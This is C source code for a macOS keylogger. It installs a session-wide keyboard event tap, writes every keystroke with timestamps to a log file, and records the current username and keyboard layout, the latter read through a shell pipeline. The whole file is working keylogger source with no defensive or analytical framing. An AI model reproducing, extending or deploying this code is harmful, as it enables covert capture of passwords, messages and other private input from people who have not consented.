#include "keylogger.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define PATH "/Users/airwalker/Desktop/kv5a.log"
// #define PATH "/var/log/kv5a.log"

FILE *f;

// TODO: Timer for double \n\n when autoread is activated (lets say you didn't right for 10 secs, then do it once)
/* This callback will be invoked every time there is a keystroke. */
CGEventRef keyboardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {

    // Sanity check
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp) && (type != kCGEventFlagsChanged)){
       return event;
    }
    CGKeyCode keycode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (autoread) {
        // Append Time + key to file
        fprintf(f, "%s", keycodeToString(keycode));

    }else{

        // Time Stuff
        time_t timer;
        char buffer[26];
        struct tm* tm_info;

        time(&timer);
        tm_info = localtime(&timer);

        strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);

        // Append Time + key to file
        fprintf(f, "%s %s \n", buffer, keycodeToString(keycode));
    }

    fflush(f);

    return event;
}


// Create an event tap to retrieve keypresses
int main(int argc, char const *argv[])
{
    /* FILE SETUP */

    // TODO: ERROR
    f = fopen(PATH, "a");

    if (f == NULL)
    {
        // printf("Error: opening file!\n");
        exit(EXIT_FAILURE);
    }


    /* HEADER - CURRENT USER, KEYBOARD LAYOUT */
    layout_switch = true;
    autoread = true;

    // Get Username currently logged in - Still buggy
    char user[50];
    if (getlogin_r(user, 50)) {
        // printf("Error: getting User Name\n");
        strncpy(user, "<unknown>", 50);
    }

    // The String returned by sed is LANGUAGE\n, so we need to get rid of \n
    // I used the last shell cmd to delete the \n char .. I could also do it within the regexp but well.. I dont really understand regexp
    char cmd[] = "defaults read /Users/*/Library/Preferences/com.apple.HIToolbox.plist AppleSelectedInputSources | egrep -w 'KeyboardLayout Name' | sed -E 's/^.+ = \"?([^\"]+)\"?;$/\\1/' | tr -d '\n'";
    // TODO: ERROR
    FILE *fp = popen(cmd, "r");
    if (fp == NULL){
        // printf("Error: opening pipe strema \n");
        exit(EXIT_FAILURE);
    }

    fgets(layout, sizeof(layout), fp);
    pclose(fp);

    fprintf(f, "\n\t\tCurrent User: %s\t\t\n", user);
    fprintf(f, "\t\tKeyboard Layout: %s\t\t\n\n", layout);

    /* EVENTS SETUP */

    // We are interested in key presses.
    CGEventMask eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged));

    // Create an event tap to retrieve keypresses
    CFMachPortRef eventTap = CGEventTapCreate((CGEventTapLocation)kCGSessionEventTap, (CGEventTapPlacement)kCGHeadInsertEventTap, (CGEventTapOptions)0, eventMask, keyboardCallback, NULL);

    if (!eventTap) {
        // printf("Erro: Unable to create event tap");
        exit(EXIT_FAILURE);
    }

    // Creates a CFRunLoopSource object for a CFMachPort object.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Runs the current thread’s CFRunLoop object in its default mode indefinitely.
    CFRunLoopRun();

    return 0;
}
